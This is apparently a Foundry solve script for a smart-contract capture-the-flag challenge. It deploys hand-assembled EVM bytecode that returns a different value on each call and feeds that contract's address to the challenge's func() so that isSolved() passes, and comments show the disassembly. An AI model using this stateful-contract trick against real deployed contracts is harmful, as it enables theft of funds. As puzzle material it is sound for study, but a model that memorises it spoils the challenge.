// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";

interface Challenge{
    function func(bytes memory input) external payable;
}
interface Setup{
    function challenge()external view returns(Challenge);
    function isSolved() external view returns (bool);
}


contract Solve is Script{
    function run()public{
        vm.startBroadcast();
        Exploit exploit=new Exploit();
        exploit.pwn();
    }
}

contract Exploit{
    address public minimal;
    Challenge challenge;
    Setup setup;
    constructor(){
        setup=Setup(0xBB42513C900808134297531970b3f79F9391D9C1);
        challenge=setup.challenge();
        address deployedAddress;
        bytes memory bytecode=hex"7d600154600f5760018055604c6015565b604d6015565b6000526020601ff3600052601e6002f3";
        assembly {
            deployedAddress := create(0, add(bytecode, 0x20), mload(bytecode))
        }
        require(deployedAddress != address(0), "Deployment failed");
        minimal=deployedAddress;
    }


    function pwn()public{
        bytes memory data = abi.encodePacked(
            minimal, // 20 bytes // Fill bytes 21 to 53 with zeroes
            hex"deadbeef" // Append 0xdeadbeef starting from byte 54
        );
        challenge.func(data);
        require(setup.isSolved(),"Exploit Failed");
    }
}



/*

[00]	PUSH1	01
[02]	SLOAD	
[03]	PUSH1	0f
[05]	JUMPI	
[06]	PUSH1	01
[08]	DUP1	
[09]	SSTORE	
[0a]	PUSH1	4c
[0c]	PUSH1	15
[0e]	JUMP	
[0f]	JUMPDEST	
[10]	PUSH1	4d
[12]	PUSH1	15
[14]	JUMP	
[15]	JUMPDEST	
[16]	PUSH1	00
[18]	MSTORE	
[19]	PUSH1	20
[1b]	PUSH1	1f
[1d]	RETURN

600154600f5760018055604c6015565b604d6015565b6000526020601ff3
600154600f5760018055604c6015565b604d6015565b60005260206000f3


push30 600154600f5760018055604c6015565b604d6015565b60005260206000f3
push1 00
mstore 
push1 0x1e
push1 0x02
return


7d600154600f5760018055604c6015565b604d6015565b6000526020601ff3600052601e6002f3
*/